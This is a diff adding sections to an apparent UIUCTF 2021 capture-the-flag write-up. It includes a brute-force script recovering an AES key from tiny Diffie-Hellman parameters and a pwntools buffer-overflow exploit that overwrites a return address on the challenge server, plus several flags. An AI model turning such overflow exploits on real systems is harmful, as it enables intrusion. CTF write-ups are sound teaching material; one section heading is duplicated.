@@ -512,4 +512,94 @@ print(ciphertext.hex())
 
 ```
 
-The ciphertext file can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/uiuctf2021/dhkeIntro/output.txt" target="_blank">here</a>.
+The ciphertext file can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/uiuctf2021/dhkeIntro/output.txt" target="_blank">here</a>. Another Diffie-Hellman problem but not really because the numbers here are so small.... A random pair of a generator and corresponding prime is selected. After that the standard implementation of Diffie-Hellman key exchange takes place. All possible pairs of generators and primes and random values of `a` and `b` can be bruteforced to obtain the key and if the chosen values successfully decrypt the ciphertext to output a message which starts with the flag format 'uiuctf{', the program will exit and output the flag. That is how I implemented the solve script :
+
+```python
+
+from Crypto.Cipher import AES
+
+ct = "b31699d587f7daf8f6b23b30cfee0edca5d6a3594cd53e1646b9e72de6fc44fe7ad40f0ea6"
+gpList = [ [13, 19], [7, 17], [3, 31], [13, 19], [17, 23], [2, 29] ]
+
+for pair in gpList:
+    g, p = pair
+    for a in range(1, p):
+        for b in range(1, p):
+            k = pow(g, a * b, p)
+            k = str(k)
+            key = ""
+            i = 0
+            padding = "uiuctf2021uiuctf2021"
+            while (16 - len(key) != len(k)):
+                key = key + padding[i]
+                i += 1
+            key = key + k
+            key = bytes(key, encoding='ascii')
+            iv = bytes("kono DIO daaaaaa", encoding = 'ascii')
+            cipher = AES.new(key, AES.MODE_CFB, iv)
+            decrypted = (cipher.decrypt(bytes.fromhex(ct))).hex()
+            decrypted = bytes.fromhex(decrypted)
+            if (b'uiuctf{' in decrypted):
+                print(decrypted)
+                exit(0)
+
+```
+
+<p> <b>Flag :</b> uiuctf{omae_ha_mou_shindeiru_b9e5f9} </p>
+
+<br/>
+
+## Pwn Warmup
+
+![UIUCTF 2021 Writeup](/assets/img/ctfImages/uiuctf2021/img12.png)
+
+The given binary can be found <a href="" target="_blank">here</a>. This is a standard buffer overflow challenge where you have to overflow the return address of the function “vulnerable” to point to ‘give_flag’ which then outputs the flag.
+
+The solve script :
+
+```python
+
+from pwn import *
+
+r = remote('pwn-warmup.chal.uiuc.tf', 1337)
+r.recvuntil(b'&give_flag = ')
+giveFlagAddr = int(r.recvline().decode(), 16)
+payload = 20 * b'A' + p64(giveFlagAddr)
+r.sendline(payload)
+print(r.recvall())
+
+```
+
+<p> <b>Flag :</b> uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3} </p>
+
+<br/>
+
+## Wasmbaby
+
+![UIUCTF 2021 Writeup](/assets/img/ctfImages/uiuctf2021/img12.png)
+
+Find the flag as a comment in the source code of the website.
+
+<p> <b>Flag :</b> uiuctf{welcome_to_wasm_e3c3bdd1} </p>
+
+<br/>
+
+## Feedback Survey
+
+![UIUCTF 2021 Writeup](/assets/img/ctfImages/uiuctf2021/img13.png)
+
+Fill out the survey to get the flag.
+
+<p> <b>Flag :</b> uiuctf{your_input_is_important_to_us_<3} </p>
+
+<br/>
+
+## Feedback Survey
+
+![UIUCTF 2021 Writeup](/assets/img/ctfImages/uiuctf2021/img13.png)
+
+Find the flag in the Discord server for the CTF.
+
+<p> <b>Flag :</b> uiuctf{y0u_j01n3d_tH3_dIsCorD!!!} </p>
+
+<br/>
